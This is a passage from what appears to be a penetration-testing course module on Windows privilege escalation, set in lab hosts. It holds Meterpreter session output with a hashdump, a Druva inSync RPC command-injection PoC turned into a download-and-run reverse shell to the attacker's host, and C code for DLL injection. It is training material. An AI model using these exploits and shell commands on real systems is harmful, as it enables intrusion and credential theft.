                            shell has gone <span class="hljs-keyword">before</span>


       =[ metasploit v6<span class="hljs-number">.0</span><span class="hljs-number">.9</span>-dev                           ]
+ <span class="hljs-comment">-- --=[ 2069 exploits - 1123 auxiliary - 352 post       ]</span>
+ <span class="hljs-comment">-- --=[ 592 payloads - 45 encoders - 10 nops            ]</span>
+ <span class="hljs-comment">-- --=[ 7 evasion                                       ]</span>

Metasploit tip: <span class="hljs-keyword">Use</span> the <span class="hljs-keyword">resource</span> command <span class="hljs-keyword">to</span> run commands <span class="hljs-keyword">from</span> a <span class="hljs-keyword">file</span>

[*] Processing handler.rc <span class="hljs-keyword">for</span> ERB directives.
<span class="hljs-keyword">resource</span> (handler.rc)&gt; <span class="hljs-keyword">use</span> exploit/multi/<span class="hljs-keyword">handler</span>
[*] <span class="hljs-keyword">Using</span> configured payload generic/shell_reverse_tcp
<span class="hljs-keyword">resource</span> (handler.rc)&gt; <span class="hljs-keyword">set</span> PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD =&gt; windows/x64/meterpreter/reverse_https
<span class="hljs-keyword">resource</span> (handler.rc)&gt; <span class="hljs-keyword">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>
LHOST =&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>
<span class="hljs-keyword">resource</span> (handler.rc)&gt; <span class="hljs-keyword">set</span> LPORT <span class="hljs-number">8443</span>
LPORT =&gt; <span class="hljs-number">8443</span>
<span class="hljs-keyword">resource</span> (handler.rc)&gt; exploit
[*] Started HTTPS <span class="hljs-keyword">reverse</span> <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> https://<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>:<span class="hljs-number">8443</span>
</code></pre>
<p><strong>Starting the Service</strong></p>
<p>Start the service, and we should get a session as <code>NT AUTHORITY\SYSTEM</code>.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net <span class="hljs-built_in">start</span> MozillaMaintenance 

The service is <span class="hljs-keyword">not</span> responding <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> control <span class="hljs-function"><span class="hljs-keyword">function</span></span>

More help is available <span class="hljs-keyword">by</span> typing NET HELPMSG <span class="hljs-number">2186</span>
</code></pre>
<p><strong>Receiving a Meterpreter Session</strong></p>
<p>We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.</p>
<p>Kernel Exploits</p>
<pre><code class="lang-shell-session">[*] Started HTTPS reverse handler on <span class="hljs-string">https:</span><span class="hljs-comment">//10.10.14.3:8443</span>
[*] <span class="hljs-string">https:</span><span class="hljs-comment">//10.10.14.3:8443 handling request from 10.129.43.13; (UUID: syyuxztc) Staging x64 payload (201308 bytes) ...</span>
[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>:<span class="hljs-number">8443</span> -&gt; <span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.13</span>:<span class="hljs-number">52047</span>) at <span class="hljs-number">2021</span><span class="hljs-number">-05</span><span class="hljs-number">-14</span> <span class="hljs-number">13</span>:<span class="hljs-number">38</span>:<span class="hljs-number">55</span> <span class="hljs-number">-0400</span>


meterpreter &gt; getuid

Server <span class="hljs-string">username:</span> NT AUTHORITY\SYSTEM


meterpreter &gt; sysinfo

<span class="hljs-string">Computer        :</span> WINLPE-WS02
<span class="hljs-string">OS              :</span> Windows <span class="hljs-number">10</span> (<span class="hljs-number">10.0</span> Build <span class="hljs-number">18363</span>).
<span class="hljs-string">Architecture    :</span> x64
System <span class="hljs-string">Language :</span> en_US
<span class="hljs-string">Domain          :</span> WORKGROUP
Logged On <span class="hljs-string">Users :</span> <span class="hljs-number">6</span>
<span class="hljs-string">Meterpreter     :</span> x64/windows


meterpreter &gt; hashdump
<span class="hljs-symbol">
Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
htb-<span class="hljs-string">student:</span><span class="hljs-number">1002</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">3</span><span class="hljs-string">c0e5d303ec84884ad5c3b7876a06ea6:</span>::
<span class="hljs-string">mrb3n:</span><span class="hljs-number">1001</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">cf3a5525ee9414229e66279623ed5c58:</span>::
<span class="hljs-string">WDAGUtilityAccount:</span><span class="hljs-number">504</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">c93428723187f868ae2f99d4fa66dceb:</span>::
</code></pre>
<h2 id="vulnerable-services">Vulnerable Services</h2>
<hr>
<p>We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let&#39;s look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.</p>
<hr>
<p><strong>Enumerating Installed Programs</strong></p>
<p>As covered previously, let&#39;s start by enumerating installed applications to get a lay of the land.</p>
<p>Vulnerable Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">wmic</span> <span class="hljs-selector-tag">product</span> <span class="hljs-selector-tag">get</span> <span class="hljs-selector-tag">name</span>

<span class="hljs-selector-tag">Name</span>
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X64</span> <span class="hljs-selector-tag">Minimum</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.28</span><span class="hljs-selector-class">.29910</span>
<span class="hljs-selector-tag">Update</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">Windows</span> 10 <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">x64-based</span> <span class="hljs-selector-tag">Systems</span> (<span class="hljs-selector-tag">KB4023057</span>)
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X86</span> <span class="hljs-selector-tag">Additional</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.24</span><span class="hljs-selector-class">.28127</span>
<span class="hljs-selector-tag">VMware</span> <span class="hljs-selector-tag">Tools</span>
<span class="hljs-selector-tag">Druva</span> <span class="hljs-selector-tag">inSync</span> 6<span class="hljs-selector-class">.6</span><span class="hljs-selector-class">.3</span>
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Update</span> <span class="hljs-selector-tag">Health</span> <span class="hljs-selector-tag">Tools</span>
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X64</span> <span class="hljs-selector-tag">Additional</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.28</span><span class="hljs-selector-class">.29910</span>
<span class="hljs-selector-tag">Update</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">Windows</span> 10 <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">x64-based</span> <span class="hljs-selector-tag">Systems</span> (<span class="hljs-selector-tag">KB4480730</span>)
<span class="hljs-selector-tag">Microsoft</span> <span class="hljs-selector-tag">Visual</span> <span class="hljs-selector-tag">C</span>++ 2019 <span class="hljs-selector-tag">X86</span> <span class="hljs-selector-tag">Minimum</span> <span class="hljs-selector-tag">Runtime</span> <span class="hljs-selector-tag">-</span> 14<span class="hljs-selector-class">.24</span><span class="hljs-selector-class">.28127</span>
</code></pre>
<p>The output looks mostly standard for a Windows 10 workstation. However, the <code>Druva inSync</code> application stands out. A quick Google search shows that version <code>6.6.3</code> is vulnerable to a command injection attack via an exposed RPC service. We may be able to use <a href="https://www.exploit-db.com/exploits/49211">this</a> exploit PoC to escalate our privileges. From this <a href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">blog post</a> which details the initial discovery of the flaw, we can see that Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful <code>NT AUTHORITY\SYSTEM</code> account. Escalation is possible by interacting with a service running locally on port 6064.</p>
<p><strong>Enumerating Local Ports</strong></p>
<p>Let&#39;s do some further enumeration to confirm that the service is running as expected. A quick look with <code>netstat</code> shows a service running locally on port <code>6064</code>.</p>
<p>Vulnerable Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; netstat -ano | findstr <span class="hljs-number">6064</span>

  TCP    <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">6064</span>         <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">0</span>              LISTENING       <span class="hljs-number">3324</span>
  TCP    <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">6064</span>         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">50274</span>        ESTABLISHED     <span class="hljs-number">3324</span>
  TCP    <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">6064</span>         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">50510</span>        TIME_WAIT       <span class="hljs-number">0</span>
  TCP    <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">6064</span>         <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">50511</span>        TIME_WAIT       <span class="hljs-number">0</span>
  TCP    <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">50274</span>        <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>:<span class="hljs-number">6064</span>         ESTABLISHED     <span class="hljs-number">3860</span>
</code></pre>
<p><strong>Enumerating Process ID</strong></p>
<p>Next, let&#39;s map the process ID (PID) <code>3324</code> back to the running process.</p>
<p>Vulnerable Services</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-built_in">get-process</span> -<span class="hljs-string">Id </span><span class="hljs-string">3324
</span>
<span class="hljs-string">Handles </span> <span class="hljs-string">NPM(</span>K)    <span class="hljs-string">PM(</span>K)      <span class="hljs-string">WS(</span>K)     <span class="hljs-string">CPU(</span>s)     <span class="hljs-string">Id </span> <span class="hljs-string">SI </span><span class="hljs-string">ProcessName
</span>-------  ------    -----      -----     ------     --  -- -----------
    <span class="hljs-string">149 </span>     <span class="hljs-string">10 </span>    <span class="hljs-string">1512 </span>      <span class="hljs-string">6748 </span>             <span class="hljs-string">3324 </span>  0 <span class="hljs-string">inSyncCPHwnet64</span>
</code></pre>
<p><strong>Enumerating Running Service</strong></p>
<p>At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the <code>Get-Service</code> cmdlet.</p>
<p>Vulnerable Services</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-built_in">get-service</span> | ? {$_.<span class="hljs-string">DisplayName </span>-<span class="hljs-string">like </span><span class="hljs-string">'Druva*'</span>}

<span class="hljs-string">Status </span>  <span class="hljs-string">Name </span>              <span class="hljs-string">DisplayName
</span>------   ----               -----------
<span class="hljs-string">Running </span> <span class="hljs-string">inSyncCPHService </span>  <span class="hljs-string">Druva </span><span class="hljs-string">inSync </span><span class="hljs-string">Client </span><span class="hljs-string">Service</span>
</code></pre>
<hr>
<h3 id="druva-insync-windows-client-local-privilege-escalation-example">Druva inSync Windows Client Local Privilege Escalation Example</h3>
<p><strong>Druva inSync PowerShell PoC</strong></p>
<p>With this information in hand, let&#39;s try out the exploit PoC, which is this short PowerShell snippet.</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">$ErrorActionPreference = <span class="hljs-string">"Stop"</span>

$cmd = <span class="hljs-string">"net user pwnd /add"</span>

$s = <span class="hljs-keyword">New</span>-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">6064</span>)

$header = [System.Text.Encoding]::UTF8.GetBytes(<span class="hljs-string">"inSync PHC RPCW[v0002]"</span>)
$rpcType = [System.Text.Encoding]::UTF8.GetBytes(<span class="hljs-string">"$([char]0x0005)`0`0`0"</span>)
$command = [System.Text.Encoding]::Unicode.GetBytes(<span class="hljs-string">"C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd"</span>);
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
</code></pre>
<p><strong>Modifying PowerShell PoC</strong></p>
<p>For our purposes, we want to modify the <code>$cmd</code> variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let&#39;s try this with <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp.ps1</a>. Download the script to our attack box, and rename it something simple like <code>shell.ps1</code>. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):</p>
<p>Vulnerable Services</p>
<pre><code class="lang-shell-session">Invoke-PowerShellTcp -Reverse -IPAddress <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span> -Port <span class="hljs-number">9443</span>
</code></pre>
<p>Modify the <code>$cmd</code> variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">$<span class="hljs-keyword">cmd</span><span class="bash"> = <span class="hljs-string">"powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"</span></span>
</code></pre>
<p><strong>Starting a Python Web Server</strong></p>
<p>Next, start a Python web server in the same directory where our <code>script.ps1</code> script resides.</p>
<p>Vulnerable Services</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python3 -m http.server <span class="hljs-number">8080</span>
</code></pre>
<p><strong>Catching a SYSTEM Shell</strong></p>
<p>Finally, start a <code>Netcat</code> listener on the attack box and execute the PoC PowerShell script on the target host (after <a href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy">modifying the PowerShell execution policy</a> with a command such as <code>Set-ExecutionPolicy Bypass -Scope Process</code>). We will get a reverse shell connection back with <code>SYSTEM</code> privileges if all goes to plan.</p>
<p>Vulnerable Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp <span class="hljs-number">9443</span>

listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">9443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.7</span>] <span class="hljs-number">58611</span>
Windows PowerShell <span class="hljs-built_in">running</span> <span class="hljs-keyword">as</span> user WINLPE-WS01$ <span class="hljs-keyword">on</span> WINLPE-WS01
Copyright (C) <span class="hljs-number">2015</span> Microsoft Corporation. All rights reserved.


PS C:\WINDOWS\system32&gt;whoami

nt authority\system


PS C:\WINDOWS\system32&gt; hostname

WINLPE-WS01
</code></pre>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>This example shows just how risky it can be to allow users to install software on their machines and how we should always enumerate installed software if we land on a Windows server or desktop host. Organizations should restrict local administrator rights on end-user machines following the principle of least privilege. Furthermore, an application whitelisting tool can help ensure that only properly vetted software is installed on user workstations.</p>
<h2 id="dll-injection">DLL Injection</h2>
<p><code>DLL injection</code> is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process&#39;s context, thereby influencing its behavior or accessing its resources.</p>
<p><code>DLL injection</code> finds legitimate applications in various areas. For instance, software developers leverage this technology for <code>hot patching</code>, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately. A prime example of this is <a href="https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works">Azure&#39;s use of hot patching for updating operational servers</a>, which facilitates the benefits of the update without necessitating server downtime.</p>
<p>Nevertheless, it&#39;s not entirely innocuous. Cybercriminals often manipulate <code>DLL injection</code> to insert malicious code into trusted processes. This technique is particularly effective in evading detection by security software.</p>
<p>There are several different methods for actually executing a DLL injection.</p>
<h3 id="loadlibrary">LoadLibrary</h3>
<p><code>LoadLibrary</code> is a widely utilized method for DLL injection, employing the <code>LoadLibrary</code> API to load the DLL into the target process&#39;s address space.</p>
<p>The <code>LoadLibrary</code> API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// Using LoadLibrary to load a DLL into the current process</span>
    HMODULE hModule = LoadLibrary(<span class="hljs-string">"example.dll"</span>);
    <span class="hljs-keyword">if</span> (hModule == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to load example.dll\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Successfully loaded example.dll\n"</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>The first example shows how <code>LoadLibrary</code> can be used to load a DLL into the current process legitimately.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// Using LoadLibrary for DLL injection</span>
    <span class="hljs-comment">// First, we need to get a handle to the target process</span>
    DWORD targetProcessId = <span class="hljs-number">123456</span> <span class="hljs-comment">// The ID of the target process</span>
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to open target process\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// Next, we need to allocate memory in the target process for the DLL path</span>
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    <span class="hljs-keyword">if</span> (dllPathAddressInRemoteMemory == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to allocate memory in target process\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// Write the DLL path to the allocated memory in the target process</span>
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, <span class="hljs-built_in">strlen</span>(dllPath), <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (!succeededWriting) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to write DLL path to target process\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// Get the address of LoadLibrary in kernel32.dll</span>
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(<span class="hljs-string">"kernel32.dll"</span>), <span class="hljs-string">"LoadLibraryA"</span>);
    <span class="hljs-keyword">if</span> (loadLibraryAddress == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to get address of LoadLibraryA\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path</span>
    HANDLE hThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to create remote thread in target process\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Successfully injected example.dll into target process\n"</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>The second example illustrates the use of <code>LoadLibrary</code> for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at <code>LoadLibrary</code> and directs towards the DLL path.</p>
<h3 id="manual-mapping">Manual Mapping</h3>
<p><code>Manual Mapping</code> is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process&#39;s memory and resolves its imports and relocations. However, it avoids easy detection by not using the <code>LoadLibrary</code> function, whose usage is monitored by security and anti-cheat systems.</p>
<p>A simplified outline of the process can be represented as follows:</p>
<ol>
<li>Load the DLL as raw data into the injecting process.</li>
<li>Map the DLL sections into the targeted process.</li>
<li>Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.</li>
</ol>
<h3 id="reflective-dll-injection">Reflective DLL Injection</h3>
<p><code>Reflective DLL injection</code> is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.</p>
<p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">Stephen Fewer has a great GitHub</a> demonstrating the technique. Borrowing his explanation below:</p>
<p>&quot;The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the &#39;host process&#39;). Second, the library must be loaded into the host process to meet the library&#39;s runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.</p>
<p>Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.</p>
<ol>
<li>Execution control is transferred to the library&#39;s <code>ReflectiveLoader</code> function, an exported function found in the library&#39;s export table. This can happen either via <code>CreateRemoteThread()</code> or a minimal bootstrap shellcode.</li>
<li>As the library&#39;s image currently resides in an arbitrary memory location, the <code>ReflectiveLoader</code> initially calculates its own image&#39;s current memory location to parse its own headers for later use.</li>
<li>The <code>ReflectiveLoader</code> then parses the host process&#39;s <code>kernel32.dll</code> export table to calculate the addresses of three functions needed by the loader, namely <code>LoadLibraryA</code>, <code>GetProcAddress</code>, and <code>VirtualAlloc</code>.</li>
<li>The <code>ReflectiveLoader</code> now allocates a continuous memory region where it will proceed to load its own image. The location isn&#39;t crucial; the loader will correctly relocate the image later.</li>
<li>The library&#39;s headers and sections are loaded into their new memory locations.</li>
<li>The <code>ReflectiveLoader</code> then processes the newly loaded copy of its image&#39;s import table, loading any additional libraries and resolving their respective imported function addresses.</li>
<li>The <code>ReflectiveLoader</code> then processes the newly loaded copy of its image&#39;s relocation table.</li>
<li>The <code>ReflectiveLoader</code> then calls its newly loaded image&#39;s entry point function, <code>DllMain,</code> with <code>DLL_PROCESS_ATTACH</code>. The library has now been successfully loaded into memory.</li>
<li>Finally, the <code>ReflectiveLoader</code> returns execution to the initial bootstrap shellcode that called it, or if it were called via <code>CreateRemoteThread</code>, the thread would terminate.&quot;</li>
</ol>
<h3 id="dll-hijacking">DLL Hijacking</h3>
<p><code>DLL Hijacking</code> is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn&#39;t specify the full path to a required DLL, hence rendering it susceptible to such attacks.</p>
<p>The default DLL search order used by the system depends on whether <code>Safe DLL Search Mode</code> is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user&#39;s current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.</p>
<ol>
<li>Press <code>Windows key + R</code> to open the Run dialog box.</li>
<li>Type in <code>Regedit</code> and press <code>Enter</code>. This will open the Registry Editor.</li>
<li>Navigate to <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager</code>.</li>
<li>In the right pane, look for the <code>SafeDllSearchMode</code> value. If it does not exist, right-click the blank space of the folder or right-click the <code>Session Manager</code> folder, select <code>New</code> and then <code>DWORD (32-bit) Value</code>. Name this new value as <code>SafeDllSearchMode</code>.</li>
<li>Double-click <code>SafeDllSearchMode</code>. In the Value data field, enter <code>1</code> to enable and <code>0</code> to disable Safe DLL Search Mode.</li>
<li>Click <code>OK</code>, close the Registry Editor and Reboot the system for the changes to take effect.</li>
</ol>
<p>With this mode enabled, applications search for necessary DLL files in the following sequence:</p>
<ol>
<li>The directory from which the application is loaded.</li>
<li>The system directory.</li>
<li>The 16-bit system directory.</li>
<li>The Windows directory.</li>
<li>The current directory.</li>
<li>The directories that are listed in the PATH environment variable.</li>
</ol>
<p>However, if &#39;Safe DLL Search Mode&#39; is deactivated, the search order changes to:</p>
<ol>
<li>The directory from which the application is loaded.</li>
<li>The current directory.</li>
<li>The system directory.</li>
<li>The 16-bit system directory.</li>
<li>The Windows directory</li>
<li>The directories that are listed in the PATH environment variable</li>
</ol>
<p>DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:</p>
<ol>
<li><code>Process Explorer</code>: Part of Microsoft&#39;s Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.</li>
<li><code>PE Explorer</code>: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.</li>
</ol>
<p>After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it&#39;s time to construct the DLL.</p>
<p>Let’s take a practical example. Consider the C program below:</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*AddFunc)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>;

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">readIntegerInput</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">int</span> value;
    <span class="hljs-keyword">char</span> input[<span class="hljs-number">100</span>];
    <span class="hljs-keyword">bool</span> isValid = <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">while</span> (!isValid)
    {
        fgets(input, <span class="hljs-keyword">sizeof</span>(input), <span class="hljs-built_in">stdin</span>);

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(input, <span class="hljs-string">"%d"</span>, &amp;value) == <span class="hljs-number">1</span>)
        {
